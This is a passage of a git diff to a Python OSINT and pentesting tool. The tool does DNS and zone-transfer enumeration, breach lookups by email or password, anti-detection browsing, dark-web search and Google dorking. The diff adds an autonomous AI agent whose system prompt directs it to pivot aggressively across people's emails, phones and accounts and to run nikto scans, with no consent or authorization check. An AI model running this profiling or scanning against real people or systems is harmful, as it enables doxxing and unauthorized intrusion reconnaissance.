+                print(f"  {Gr}SRV records found: {len(srv_found)}{Wh}")
+                for svc, recs in sorted(srv_found, key=lambda x: x[0])[:15]:
+                    print(f"    {C}{svc}.{domain}{Wh}")
+            else:
+                print(f"  {Y}No SRV records found{RS}")
+
+            section('Reverse Lookup')
+            if a_recs:
+                rev_results = engine.brute_reverse(a_recs)
+                for ip, ptrs in rev_results:
+                    print(f"  {C}{ip}{Wh} -> {Gr}{', '.join(ptrs)}{Wh}")
+
+            elapsed = time.time() - start
+            print(f"\n  {Gr}Enumeration complete in {elapsed:.1f} seconds{RS}")
+            input(f"\n{Wh}[+{Wh}] Press Enter to continue")
+
+        else:
+            print(f"{R}[!] Invalid option{RS}")
+            time.sleep(1)
+
+
 def check_domain_security(domain: str) -> Dict:
     """فحص أمان النطاق"""
     security = {
@@ -3479,7 +5843,7 @@ def check_domain_security(domain: str) -> Dict:
     return security
 
 
-def domain_osint_Enhanced():
+def domain_osint():
     domain = input(f"\n{Wh}[?] Enter domain {Gr}[e.g., example.com]{Wh}: {Gr}").strip()
     if not domain:
         print(f"{R}[!] Domain cannot be empty!")
@@ -3489,7 +5853,7 @@ def domain_osint_Enhanced():
     domain = domain.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
     
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🌐 DOMAIN OSINT INVESTIGATION (ENHANCED)")
+    print(f" {R} DOMAIN OSINT INVESTIGATION (ENHANCED)")
     print(f" {Wh}{'='*50}")
     
     data = {}
@@ -3517,7 +5881,7 @@ def domain_osint_Enhanced():
     if subdomains:
         print(f"{Gr}[+] Found {len(subdomains)} subdomains{Wh}")
         for sub in sorted(subdomains)[:15]:
-            print(f"    {C}├─ {sub}{RS}")
+            print(f"    {C} {sub}{RS}")
         data['Subdomains'] = subdomains
     else:
         print(f"{Y}[-] No subdomains found{Wh}")
@@ -3535,7 +5899,7 @@ def domain_osint_Enhanced():
     if related.get('similar'):
         print(f"{Wh}[*] Similar domains (typosquatting):{Wh}")
         for sim in related['similar'][:5]:
-            print(f"    {C}├─ {sim}{RS}")
+            print(f"    {C} {sim}{RS}")
         data['Related'] = related
     
     print(f"{Y}[*] Wayback Machine check...{Wh}")
@@ -3553,7 +5917,7 @@ def domain_osint_Enhanced():
         data["WHOIS"] = whois_data["raw"]
     
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🔗 ADDITIONAL RESOURCES")
+    print(f" {R} ADDITIONAL RESOURCES")
     print(f" {Wh}{'='*50}")
     print(f"{Wh} VirusTotal     : {C}https://www.virustotal.com/gui/domain/{domain}{RS}")
     print(f"{Wh} SecurityTrails : {C}https://securitytrails.com/domain/{domain}{RS}")
@@ -3572,8 +5936,6 @@ def domain_osint_Enhanced():
     )
     save_report(result)
     input(f"\n{Wh}[+{Wh}] Press Enter to continue")
-
-domain_osint = domain_osint_Enhanced
 
 
 def download_with_form_submission(url: str, session: requests.Session, output_dir: Path) -> Dict:
@@ -3617,15 +5979,17 @@ def download_with_form_submission(url: str, session: requests.Session, output_di
                             form_data[inp_name] = inp_value
                         else:
                             if 'user' in inp_name.lower() or 'name' in inp_name.lower():
-                                form_data[inp_name] = 'testuser'
+                                form_data[inp_name] = 'testuser_osint'
                             elif 'pass' in inp_name.lower() or 'pwd' in inp_name.lower():
-                                form_data[inp_name] = 'testpass123'
+                                form_data[inp_name] = 'testpass_osint123'
                             elif 'email' in inp_name.lower():
-                                form_data[inp_name] = 'test@example.com'
+                                form_data[inp_name] = 'osint_test@example.com'
                             elif 'confirm' in inp_name.lower():
-                                form_data[inp_name] = 'testpass123'
+                                form_data[inp_name] = 'testpass_osint123'
+                            elif 'phone' in inp_name.lower():
+                                form_data[inp_name] = '+1234567890'
                             else:
-                                form_data[inp_name] = inp_value if inp_value else 'test_' + inp_name
+                                form_data[inp_name] = inp_value if inp_value else f'test_{inp_name}'
                 
                 try:
                     if method == 'POST':
@@ -3638,8 +6002,8 @@ def download_with_form_submission(url: str, session: requests.Session, output_di
                         f.write(response.text)
                     downloaded.append(str(form_file))
                     
-                    for hist in response.history:
-                        hist_file = output_dir / f"redirect_{len(response.history)}.html"
+                    for hist_idx, hist in enumerate(response.history):
+                        hist_file = output_dir / f"redirect_{hist_idx+1}.html"
                         with open(hist_file, 'w', encoding='utf-8') as f:
                             f.write(hist.text)
                         downloaded.append(str(hist_file))
@@ -3791,16 +6155,14 @@ def download_website_source(url: str, output_dir: Path) -> Dict:
     return result
 
 
-original_website_downloader = website_downloader
-
-def website_downloader_enhanced():
+def website_downloader():
     if BeautifulSoup is None:
         print(f"{R}[!] Install BeautifulSoup4: pip install beautifulsoup4{RS}")
         input(f"\n{Wh}[+] Press Enter")
         return
 
     print(f"\n {Wh}{'='*55}")
-    print(f" {R}🌐 WEBSITE SOURCE DOWNLOADER")
+    print(f" {R} WEBSITE SOURCE DOWNLOADER")
     print(f" {Wh}{'='*55}")
     print(f"{Y}[!] Supports: Forms (POST/GET), Cookies, Assets (JS/CSS){Wh}")
 
@@ -3887,7 +6249,7 @@ def website_downloader_enhanced():
         elapsed = time.time() - start_time
         
         print(f"\n {Wh}{'='*55}")
-        print(f" {Gr}✅ DOWNLOAD COMPLETE")
+        print(f" {Gr} DOWNLOAD COMPLETE")
         print(f" {Wh}{'='*55}")
         print(f"{Wh} Files Downloaded: {Gr}{len(result['downloaded'])}")
         print(f"{Wh} Forms Processed:  {Gr}{result.get('forms_processed', 0)}")
@@ -3922,9 +6284,6 @@ def website_downloader_enhanced():
         print(f"{R}[!] Error: {e}{Wh}")
     
     input(f"\n{Wh}[+] Press Enter")
-
-website_downloader = website_downloader_enhanced
-
 
 USERNAME_CONFIDENCE_RULES = {
     "high_confidence": {
@@ -4334,7 +6693,7 @@ def search_dehashed(query: str, query_type: str = "auto") -> Dict:
 
 def dehashed_menu():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🔐 DEHASHED BREACH SEARCH")
+    print(f" {R} DEHASHED BREACH SEARCH")
     print(f" {Wh}{'='*50}")
     print(f"{Wh}[?] Search by: {Gr}email, username, phone, ip, domain, name, password{Wh}")
     query = input(f"\n{Wh}[+] Query: {Gr}").strip()
@@ -4365,7 +6724,7 @@ def dehashed_menu():
 
     if entries:
         for i, e in enumerate(entries[:15], 1):
-            print(f"\n{Wh}─── Entry #{i} ───")
+            print(f"\n{Wh} Entry #{i} ")
             if e.get("email") and e["email"] != "N/A":
                 print(f"{Wh} Email    : {Gr}{e['email']}")
             if e.get("username") and e["username"] != "N/A":
@@ -4407,7 +6766,7 @@ ONION_SITES = {
 
 def stealth_browser_menu():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🕵️ STEALTH BROWSER (Anti-Detection)")
+    print(f" {R} STEALTH BROWSER (Anti-Detection)")
     print(f" {Wh}{'='*50}")
     print(f"{Y}[!] Uses Playwright with anti-fingerprinting{Wh}")
     print(f"{Y}[!] Spoofs: WebDriver, Canvas, WebGL, Fonts, Timezone{Wh}")
@@ -4554,7 +6913,7 @@ def search_darkweb(query: str) -> Dict:
 
 def darkweb_menu():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🌑 DARK WEB OSINT")
+    print(f" {R} DARK WEB OSINT")
     print(f" {Wh}{'='*50}")
 
     if not check_tor_available():
@@ -4574,7 +6933,7 @@ def darkweb_menu():
     results = search_darkweb(query)
 
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}📊 DARK WEB RESULTS")
+    print(f" {R} DARK WEB RESULTS")
     print(f" {Wh}{'='*50}")
     print(f"{Wh} Query          : {Gr}{query}")
     print(f"{Wh} Tor Available  : {Gr}{results['tor_available']}")
@@ -4596,7 +6955,7 @@ def darkweb_menu():
             for site in reachable:
                 print(f"    {Gr}[+] {C}{site['url'][:60]}{Wh} - {Y}{site.get('title', 'N/A')}")
 
-    print(f"\n{Wh}─── Summary ───")
+    print(f"\n{Wh} Summary ")
     print(f"{Wh} {results['summary']}")
 
     result = ScanResult(
@@ -4696,7 +7055,7 @@ def execute_google_dork(dork: str, pages: int = 1) -> Dict:
 
 def dork_builder_menu():
     print(f"\n {Wh}{'='*50}")
-    print(f" {R}🔍 GOOGLE DORKS BUILDER")
+    print(f" {R} GOOGLE DORKS BUILDER")
     print(f" {Wh}{'='*50}")
 
     cat_list = list(DORK_CATEGORIES.keys())
@@ -4724,7 +7083,7 @@ def dork_builder_menu():
     if target:
         dork = f"{dork} site:{target}"
 
-    print(f"\n{Wh}─── Generated Dork ───")
+    print(f"\n{Wh} Generated Dork ")
     print(f"{C}{dork}{RS}")
 
     if input(f"\n{Wh}[?] Execute search? {Gr}(y/n){Wh}: {Gr}").strip().lower() == 'y':
@@ -4880,7 +7239,7 @@ def scrape_profile_page(url: str, html: str) -> Dict:
 
 def agentic_investigation():
     print(f"\n {Wh}{'='*55}")
-    print(f" {R}🤖 AGENTIC AI OSINT INVESTIGATION")
+    print(f" {R} AGENTIC AI OSINT INVESTIGATION")
     print(f" {Wh}{'='*55}")
     print(f"{Y}[!] Autonomous multi-step investigation engine{Wh}")
     print(f"{Y}[!] Starts with one input and recursively discovers everything{Wh}")
@@ -4889,7 +7248,7 @@ def agentic_investigation():
     if not target:
         return
 
-    print(f"\n{Wh}─── Starting investigation for: {C}{target}{RS} ───")
+    print(f"\n{Wh} Starting investigation for: {C}{target}{RS} ")
     start_time = time.time()
 
     if "@" in target:
@@ -4907,7 +7266,7 @@ def agentic_investigation():
     elapsed = time.time() - start_time
 
     print(f"\n {Wh}{'='*55}")
-    print(f" {Gr}📊 INVESTIGATION REPORT")
+    print(f" {Gr} INVESTIGATION REPORT")
     print(f" {Wh}{'='*55}")
     print(f"{Wh} Target          : {C}{target}")
     print(f"{Wh} Duration        : {Gr}{elapsed:.1f}s")
@@ -4916,8 +7275,8 @@ def agentic_investigation():
 
     def print_tree(node: InvestigationNode, indent: int = 0):
         prefix = "  " * indent
-        icon = {"email": "📧", "username": "👤", "domain": "🌐", "ip": "🌍", "phone": "📱",
-                "email_found": "📧", "phone_found": "📱", "avatar": "🖼️"}.get(node.data_type, "•")
+        icon = {"email": "", "username": "", "domain": "", "ip": "", "phone": "",
+                "email_found": "", "phone_found": "", "avatar": ""}.get(node.data_type, "•")
         print(f"{prefix}{Wh}{icon} {C}{node.data_type}: {Gr}{node.value}{Wh}")
         if node.findings:
             for k, v in list(node.findings.items())[:3]:
@@ -4948,6 +7307,1283 @@ def agentic_investigation():
 
 def count_nodes(node: InvestigationNode) -> int:
     return 1 + sum(count_nodes(c) for c in node.children)
+
+
+def load_reports() -> List[Dict]:
+    reports_dir = Path(CONFIG["output_dir"])
+    if not reports_dir.exists():
+        return []
+    reports = []
+    for f in sorted(reports_dir.glob("*.json"), key=os.path.getmtime, reverse=True)[:20]:
+        try:
+            with open(f, encoding="utf-8") as fh:
+                reports.append(json.load(fh))
+        except:
+            pass
+    return reports
+
+def ai_correlation_engine():
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} AI CORRELATION ENGINE")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] Groq-powered OSINT data correlation & analysis{Wh}")
+
+    if Groq is None:
+        print(f"{R}[!] Groq not installed. Run: pip install groq{Wh}")
+        input(f"\n{Wh}[+] Press Enter")
+        return
+
+    api_key = os.environ.get("GROQ_API_KEY")
+    if not api_key:
+        print(f"{Y}[!] GROQ_API_KEY not set in environment{Wh}")
+        key = input(f"{Wh}[+] Enter your Groq API key {Gr}[or leave empty to skip]{Wh}: {Gr}").strip()
+        if not key:
+            return
+        os.environ["GROQ_API_KEY"] = key
+        api_key = key
+
+    reports = load_reports()
+    manual_data = {}
+
+    print(f"\n{Wh} DATA SOURCES ")
+    print(f"{Wh}  {Gr}1{Wh}) Automatic — from saved reports ({len(reports)} found)")
+    print(f"{Wh}  {Gr}2{Wh}) Manual entry — type/paste data yourself")
+    print(f"{Wh}  {Gr}3{Wh}) Both — reports + manual")
+
+    src_choice = input(f"\n{Wh}[+] Choose source {Gr}[1/2/3]{Wh}: {Gr}").strip()
+
+    if src_choice in ("2", "3"):
+        print(f"\n{Y}[*] Paste the OSINT data to analyze (multi-line, Ctrl+Z then Enter to finish):{Wh}")
+        lines = []
+        try:
+            while True:
+                line = input()
+                lines.append(line)
+        except EOFError:
+            pass
+        raw = "\n".join(lines).strip()
+        if raw:
+            try:
+                manual_data = json.loads(raw) if raw.startswith("{") else {"raw_data": raw}
+            except json.JSONDecodeError:
+                manual_data = {"raw_data": raw}
+
+    if src_choice == "1" and not reports:
+        print(f"{R}[!] No saved reports found. Run some scans first.{Wh}")
+        input(f"\n{Wh}[+] Press Enter")
+        return
+
+    print(f"\n{Y}[*] Sending data to AI for correlation & analysis...{Wh}")
+    print(f"{Y}[*] Model: {GROQ_MODEL}{Wh}")
+
+    system_prompt = """You are an expert OSINT analyst AI. Your task is to analyze, correlate, and enrich the provided intelligence data.
+
+Follow these steps:
+1. DATA SUMMARY — Categorize each piece of data (IP, email, username, phone, domain, breach, etc.)
+2. CROSS-CORRELATION — Identify links between seemingly unrelated data points (same IP hosting multiple domains, email username matching social media handles, phone country matching IP location, etc.)
+3. PATTERN RECOGNITION — Detect anomalies, common infrastructure, repeated names, overlapping timestamps
+4. RISK ASSESSMENT — Score the target's exposure risk (0-100) based on data leaked, interconnectedness, attack surface
+5. NEW DERIVED INSIGHTS — Generate new intelligence that is not explicitly in the raw data but logically inferred:
+   - Likely professions, locations, interests
+   - Connected accounts across platforms
+   - Possible email/username patterns for undiscovered accounts
+   - Infrastructure relationships (same owner, hosting provider)
+   - Behavioral patterns (posting times, platforms used)
+6. ACTIONABLE RECOMMENDATIONS — Suggest specific next steps for deeper investigation
+
+Format your response in clear sections with markdown headings. Be concise but thorough. Base every conclusion on the data provided and label inferred insights as [INFERRED]."""
+
+    context_data = {}
+    if reports:
+        context_data["saved_reports"] = reports
+    if manual_data:
+        context_data["manual_input"] = manual_data
+
+    try:
+        client = Groq(api_key=api_key)
+        completion = client.chat.completions.create(
+            model=GROQ_MODEL,
+            messages=[
+                {"role": "system", "content": system_prompt},
+                {"role": "user", "content": json.dumps(context_data, indent=2, default=str)}
+            ],
+            temperature=0.7,
+            max_tokens=4096,
+            top_p=0.95,
+            stream=True,
+            stop=None
+        )
+
+        print(f"\n{Gr} AI CORRELATION RESULTS {Wh}{RS}\n")
+        full_response = []
+        for chunk in completion:
+            content = chunk.choices[0].delta.content or ""
+            print(content, end="", flush=True)
+            full_response.append(content)
+        print(f"\n\n{Wh}{''*38}{RS}")
+
+        result_text = "".join(full_response)
+        result = ScanResult(
+            timestamp=datetime.now().isoformat(),
+            scan_type="ai_correlation",
+            target="correlation_analysis",
+            data={"report_count": len(reports), "analysis": result_text}
+        )
+        save_report(result)
+        print(f"{Gr}[] Analysis saved to reports/{Wh}")
+
+    except Exception as e:
+        print(f"\n{R}[!] AI request failed: {e}{Wh}")
+
+    input(f"\n{Wh}[+] Press Enter")
+
+
+# ── AI Agent System — Unified Tool-Aware Autonomous Investigator ─────
+# Agent wrappers for tools that normally use input()
+def _agent_ip_track(ip: str) -> Dict:
+    result = {"ip": ip}
+    if not validate_ip(ip):
+        result["error"] = "Invalid IP"
+        return result
+    info = get_ip_info(ip)
+    result.update(info)
+    return result
+
+def _agent_phone_lookup(phone: str) -> Dict:
+    result = {"phone": phone}
+    try:
+        import phonenumbers
+        x = phonenumbers.parse(phone, None)
+        result["valid"] = phonenumbers.is_valid_number(x)
+        result["country"] = phonenumbers.region_code_for_number(x)
+        result["carrier"] = carrier.name_for_number(x, "en") if hasattr(carrier, 'name_for_number') else "N/A"
+        result["timezones"] = list(phone_timezone.time_zones_for_number(x)) if hasattr(phone_timezone, 'time_zones_for_number') else []
+        result["formatted"] = phonenumbers.format_number(x, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+def _agent_username_track(username: str) -> Dict:
+    result = {"username": username, "profiles": {}}
+    session = get_session()
+    platforms = [
+        ("GitHub", "https://www.github.com/{}"),
+        ("Reddit", "https://www.reddit.com/user/{}"),
+        ("Twitter/X", "https://x.com/{}"),
+        ("Instagram", "https://www.instagram.com/{}"),
+        ("Telegram", "https://t.me/{}"),
+        ("Medium", "https://medium.com/@{}"),
+        ("Twitch", "https://www.twitch.tv/{}"),
+        ("TikTok", "https://www.tiktok.com/@{}"),
+        ("YouTube", "https://www.youtube.com/@{}"),
+        ("Pinterest", "https://www.pinterest.com/{}"),
+        ("Snapchat", "https://www.snapchat.com/add/{}"),
+    ]
+    for name, url_tpl in platforms:
+        try:
+            url = url_tpl.format(username)
+            resp = session.get(url, timeout=5, allow_redirects=True)
+            if resp.status_code == 200 or resp.status_code == 403:
+                result["profiles"][name] = url
+        except:
+            pass
+    result["profiles_found"] = len(result["profiles"])
+    return result
+
+def _agent_email_osint(email: str) -> Dict:
+    result = {"email": email}
+    result["breaches"] = check_email_breaches_advanced(email)
+    username = email.split("@")[0] if "@" in email else ""
+    domain = email.split("@")[1] if "@" in email else ""
+    if username:
+        try:
+            result["username_search"] = _agent_username_track(username)
+        except:
+            pass
+    if domain:
+        try:
+            result["domain_info"] = dns_lookup(domain)
+        except:
+            pass
+    return result
+
+def _agent_pastebin_search(query: str) -> Dict:
+    result = {"query": query, "results": []}
+    try:
+        resp = requests.get(
+            f"https://psbdmp.ws/api/search/{requests.utils.quote(query)}",
+            timeout=8,
+            headers={"User-Agent": random.choice(CONFIG["user_agents"])}
+        )
+        if resp.status_code == 200:
+            data = resp.json()
+            if isinstance(data, list):
+                result["results"] = data[:20]
+                result["count"] = len(data)
+            elif isinstance(data, dict):
+                result["results"] = [data]
+                result["count"] = 1
+    except:
+        try:
+            resp = requests.get(
+                f"https://pastebin.com/search?q={requests.utils.quote(query)}",
+                timeout=8,
+                headers={"User-Agent": random.choice(CONFIG["user_agents"])}
+            )
+            if resp.status_code == 200:
+                result["raw_html_size"] = len(resp.text)
+                result["note"] = "Scraped pastebin search page"
+        except:
+            result["error"] = "Search failed"
+    return result
+
+def _agent_github_search(query: str) -> Dict:
+    result = {"query": query, "repos": [], "code": [], "users": []}
+    session = get_session()
+    try:
+        resp = session.get(
+            f"https://api.github.com/search/code?q={requests.utils.quote(query)}&per_page=10",
+            timeout=8
+        )
+        if resp.status_code == 200:
+            items = resp.json().get("items", [])
+            for item in items[:10]:
+                result["code"].append({
+                    "repo": item.get("repository", {}).get("full_name", ""),
+                    "path": item.get("path", ""),
+                    "url": item.get("html_url", "")
+                })
+    except:
+        pass
+    try:
+        resp = session.get(
+            f"https://api.github.com/search/repositories?q={requests.utils.quote(query)}&per_page=5",
+            timeout=8
+        )
+        if resp.status_code == 200:
+            items = resp.json().get("items", [])
+            for item in items[:5]:
+                result["repos"].append({
+                    "name": item.get("full_name", ""),
+                    "desc": item.get("description", ""),
+                    "url": item.get("html_url", ""),
+                    "stars": item.get("stargazers_count", 0)
+                })
+    except:
+        pass
+    return result
+
+def _agent_dns_enum(domain: str) -> Dict:
+    result = {"domain": domain}
+    engine = DnsReconEngine(domain)
+    result["dns"] = engine.standard_enum(do_axfr=True)
+    result["subdomains_crt"] = get_subdomains_crt(domain)[:30]
+    result["technologies"] = get_domain_technologies(domain)
+    result["security"] = check_domain_security(domain)
+    result["related"] = get_domain_related(domain)
+    try:
+        result["whois"] = whois_lookup(domain)
+    except:
+        pass
+    return result
+
+# ── AI Agent System v2 — Multi-Step Deep Investigator ───────────────
+
+AGENT_SYSTEM_PROMPT = """You are an autonomous OSINT AI agent embedded inside the Ghost0xK pentesting tool. Your goal is to perform a **deep, multi-step investigation** of the given target by calling tools, analyzing results, and discovering hidden connections.
+
+## TOOL CATALOG
+
+### DNS & Domain Tools
+1. `dns_lookup(domain)` — A, AAAA records. Returns `{"A":[...],"AAAA":[...]}`
+2. `dns_records_full(domain)` — NS, MX, TXT, SOA. Returns `{"NS":[...],"MX":[...],"TXT":[...],"SOA":{...}}`
+3. `whois_lookup(domain)` — Registrar, dates, contacts. Returns registrar + raw text
+4. `get_subdomains_crt(domain)` — CRT.sh certificate transparency. Returns list of subdomains
+5. `check_domain_security(domain)` — SSL, HSTS, SPF, DMARC booleans
+6. `get_domain_technologies(domain)` — Server, CDN, frameworks, analytics, CMS
+7. `get_domain_related(domain)` — Typosquatting/similar domains
+8. `check_ssl_cert(domain)` — Issuer, subject, validity dates
+9. `wayback_check(domain)` — Archived snapshots from Wayback Machine
+10. `agent_dns_enum(domain)` — **All-in-one**: full DNS + AXFR + subdomains CRT + tech + security + related + WHOIS
+
+### IP & Network Tools
+11. `get_ip_info(ip)` — Geolocation (country, city, lat/lon), ISP, org, ASN
+12. `agent_ip_track(ip)` — Full IP tracking with abuse reports
+
+### Email Tools
+13. `agent_email_osint(email)` — **All-in-one**: breach check + username track (extracted username) + domain DNS
+14. `check_email_platforms(email)` — **Holehe-style**: checks if email is registered on Twitter, Instagram, Adobe, Snapchat, Spotify, Pinterest, Tumblr, Patreon, Dribbble, GitLab, WordPress.com
+
+### Username Tools
+15. `agent_username_track(username)` — Searches 11 platforms (GitHub, Reddit, Twitter/X, Instagram, Telegram, Medium, Twitch, TikTok, YouTube, Pinterest, Snapchat)
+
+### Phone Tools
+16. `agent_phone_lookup(phone)` — Validity, country, carrier, timezone, formatted number
+
+### Search & OSINT Tools
+17. `agent_pastebin_search(query)` — Pastebin/dump sites for leaked data
+18. `agent_github_search(query)` — GitHub code + repositories search
+19. `harvester_search(query, sources)` — **theHarvester-style**: searches Google/Bing for emails, CRT.sh for subdomains, DNS for IPs. sources: "all","google","bing","crt","dns"
+20. `social_scraper(platform, query, limit)` — **snscrape**: scrape Twitter or Reddit posts without API. platform: "twitter" or "reddit"
+
+### Web & Security Tools
+21. `whatweb_detect(target)` — **whatweb**: detailed tech/CMS/version detection (CLI)
+22. `nikto_scan(target)` — **nikto**: web vulnerability scanner for dangerous files/CGI (CLI)
+23. `gospider_crawl(target, depth)` — **gospider**: deep JS-aware crawler, extracts URLs, forms, JS files, subdomains (CLI)
+
+## INVESTIGATION PROTOCOL
+
+You MUST follow this exact sequence for every target:
+
+### PHASE 1 — PLAN (first response only)
+Output a JSON plan:
+```json
+{"phase": "plan", "target_type": "email|domain|username|ip|phone", "plan": ["Step 1: ...", "Step 2: ...", "Step 3: ...", ...], "expected_pivots": ["what new targets might appear"]}
+```
+Your plan must have **5-10 steps** based on target type.
+
+### PHASE 2 — EXECUTE (subsequent responses)
+For each step, call ONE tool:
+```json
+{"phase": "execute", "step": 1, "reasoning": "why this tool now", "tool": "tool_name", "params": {"key": "value"}}
+```
+- After each tool result, analyze it for **new leads** (IPs, emails, usernames, domains, phones)
+- If you discover a new lead, add it to the investigation queue automatically
+- Do NOT conclude until you have called **at least 6 different tools**
+
+### PHASE 3 — CORRELATE (after all tools called)
+After calling 6+ tools, do a correlation pass:
+```json
+{"phase": "correlate", "reasoning": "connecting findings across all data sources", "connections_found": ["IP x.x.x.x hosts both domain A and email B's mail server", "username found on Twitter matches email prefix", ...], "risk_score": 0-100}
+```
+
+### PHASE 4 — FINAL REPORT
+```json
+{"phase": "final", "target": "...", "summary": "comprehensive investigation summary", "tools_used": ["tool1","tool2",...], "key_findings": ["finding 1","finding 2",...], "risk_score": 0-100, "connections_discovered": ["connection 1",...], "new_leads": ["lead 1","lead 2",...], "recommendations": ["rec 1","rec 2",...]}
+```
+
+## MANDATORY RULES
+1. **Plan first** — your very first response MUST be a plan
+2. **Minimum 6 tool calls** — do NOT conclude before calling at least 6 different tools
+3. **Follow the plan** — execute each step in order
+4. **Pivot aggressively** — every result may contain new targets (IPs, emails, domains). Investigate them too
+5. **Correlate** — after collecting data, identify cross-source connections
+6. **Be exhaustive** — for domains: DNS+WHOIS+subdomains+tech+security+related+wayback+whatweb+nikto. For emails: platforms+breaches+username+domain. For usernames: platforms+email patterns+github+pastebin+social_scraper
+7. **Use the all-in-one tools** (agent_dns_enum, agent_email_osint) as force multipliers, then dig deeper with specific tools
+"""
+
+
+class AIAgent:
+    def __init__(self, api_key: str, target: str):
+        self.api_key = api_key
+        self.target = target
+        self.model = GROQ_MODEL
+        self.client = Groq(api_key=api_key)
+        self.history = []
+        self.findings = {}
+        self.iteration = 0
+        self.max_iterations = 40
+        self.min_tool_calls = 6
+        self.target_type = self._detect_type(target)
+        self.plan = []
+        self.pending_pivots = []
+        self.tools_called = 0
+        self.phase = "plan"
+        self.correlated = False
+
+    def _detect_type(self, target: str) -> str:
+        if "@" in target:
+            return "email"
+        if validate_ip(target):
+            return "ip"
+        if validate_phone(target):
+            return "phone"
+        if "." in target and not target.startswith("http") and len(target.split(".")) >= 2:
+            return "domain"
+        return "username"
+
+    def _call_llm(self, messages: List) -> str:
+        try:
+            completion = self.client.chat.completions.create(
+                model=self.model,
+                messages=messages,
+                temperature=0.75,
+                max_tokens=3000,
+                top_p=0.95
+            )
+            return completion.choices[0].message.content.strip()
+        except Exception as e:
+            return json.dumps({"phase": "final", "summary": f"LLM error: {e}",
+                               "key_findings": [], "risk_score": 0})
+
+    def _execute_tool(self, tool_name: str, params: Dict) -> Dict:
+        tool_map = {
+            "dns_lookup": lambda p: dns_lookup(p.get("domain", "")),
+            "dns_records_full": lambda p: dns_records_full(p.get("domain", "")),
+            "whois_lookup": lambda p: whois_lookup(p.get("domain", "")),
+            "get_subdomains_crt": lambda p: get_subdomains_crt(p.get("domain", "")),
+            "check_domain_security": lambda p: check_domain_security(p.get("domain", "")),
+            "get_domain_technologies": lambda p: get_domain_technologies(p.get("domain", "")),
+            "get_domain_related": lambda p: get_domain_related(p.get("domain", "")),
+            "check_ssl_cert": lambda p: check_ssl_cert(p.get("domain", "")),
+            "wayback_check": lambda p: wayback_check(p.get("domain", "")),
+            "agent_dns_enum": lambda p: _agent_dns_enum(p.get("domain", "")),
+            "get_ip_info": lambda p: get_ip_info(p.get("ip", "")),
+            "agent_email_osint": lambda p: _agent_email_osint(p.get("email", "")),
+            "agent_username_track": lambda p: _agent_username_track(p.get("username", "")),
+            "agent_phone_lookup": lambda p: _agent_phone_lookup(p.get("phone", "")),
+            "agent_pastebin_search": lambda p: _agent_pastebin_search(p.get("query", "")),
+            "agent_github_search": lambda p: _agent_github_search(p.get("query", "")),
+            "agent_ip_track": lambda p: _agent_ip_track(p.get("ip", "")),
+            "check_email_platforms": lambda p: check_email_platforms(p.get("email", "")),
+            "harvester_search": lambda p: harvester_search(p.get("query", ""), p.get("sources", "all")),
+            "social_scraper": lambda p: social_scraper(p.get("platform", "twitter"), p.get("query", ""), int(p.get("limit", 20))),
+            "whatweb_detect": lambda p: whatweb_detect(p.get("target", "")),
+            "nikto_scan": lambda p: nikto_scan(p.get("target", "")),
+            "gospider_crawl": lambda p: gospider_crawl(p.get("target", ""), int(p.get("depth", 2))),
+        }
+        fn = tool_map.get(tool_name)
+        if not fn:
+            return {"error": f"Unknown tool: {tool_name}"}
+        try:
+            result = fn(params)
+            return result if isinstance(result, dict) else {"result": str(result)}
+        except Exception as e:
+            return {"error": str(e)}
+
+    def _extract_pivots(self, tool_name: str, result: Dict) -> List[Dict]:
+        """Extract new investigation leads from tool results"""
+        pivots = []
+        if isinstance(result, dict):
+            for key, val in result.items():
+                if key in ("ip", "ips", "A") and isinstance(val, str) and validate_ip(val):
+                    pivots.append({"type": "ip", "value": val, "source": tool_name})
+                if key in ("ip", "ips", "A") and isinstance(val, list):
+                    for v in val:
+                        if isinstance(v, str) and validate_ip(v):
+                            pivots.append({"type": "ip", "value": v, "source": tool_name})
+                if key == "domain" and isinstance(val, str) and "." in val:
+                    pivots.append({"type": "domain", "value": val, "source": tool_name})
+                if key == "email" and isinstance(val, str) and "@" in val:
+                    pivots.append({"type": "email", "value": val, "source": tool_name})
+                if key == "username" and isinstance(val, str) and len(val) > 2:
+                    pivots.append({"type": "username", "value": val, "source": tool_name})
+                if key == "profiles" and isinstance(val, dict):
+                    for platform, url in val.items():
+                        pivots.append({"type": "profile_url", "value": url, "source": f"{tool_name}/{platform}"})
+        return pivots
+
+    def run(self) -> Dict:
+        print(f"\n{Gr}[+] AI Agent starting deep investigation: {C}{self.target}{Wh} ({self.target_type}){RS}")
+        print(f"{Y}[*] Model: {self.model} | Min tools: {self.min_tool_calls}{RS}\n")
+
+        self.history.append({"role": "user", "content": f"Target: {self.target}\nType: {self.target_type}\nStart the investigation."})
+
+        while self.iteration < self.max_iterations:
+            self.iteration += 1
+            phase_label = self.phase.upper()
+            print(f"\n{Wh}[{R}{self.iteration}{Wh}] [{C}{phase_label}{Wh}] {Gr}Thinking...{RS}")
+
+            sys_msgs = [
+                {"role": "system", "content": AGENT_SYSTEM_PROMPT},
+                *self.history[-15:],
+            ]
+
+            # Build context-rich user message
+            context_parts = [f"Target: {self.target} ({self.target_type})"]
+            context_parts.append(f"Phase: {self.phase} | Iteration: {self.iteration}")
+            context_parts.append(f"Tools called so far: {self.tools_called} (minimum needed: {self.min_tool_calls})")
+            if self.plan:
+                plan_str = "\n".join(f"  {i+1}. {s}" for i, s in enumerate(self.plan))
+                context_parts.append(f"Investigation plan:\n{plan_str}")
+            if self.pending_pivots:
+                pivot_str = "\n".join(f"  › {p['type']}: {p['value']} (from {p['source']})" for p in self.pending_pivots[:5])
+                context_parts.append(f"Pending new leads to investigate:\n{pivot_str}")
+            if self.findings:
+                context_parts.append(f"Discovered data keys: {list(self.findings.keys())}")
+            context_parts.append("Continue the investigation. If you have called 6+ tools and gathered sufficient data, "
+                                 "first do a correlation pass (phase=correlate) then final report (phase=final).")
+
+            user_msg = "\n".join(context_parts)
+            response_text = self._call_llm(sys_msgs + [{"role": "user", "content": user_msg}])
+
+            try:
+                decision = json.loads(response_text)
+            except json.JSONDecodeError:
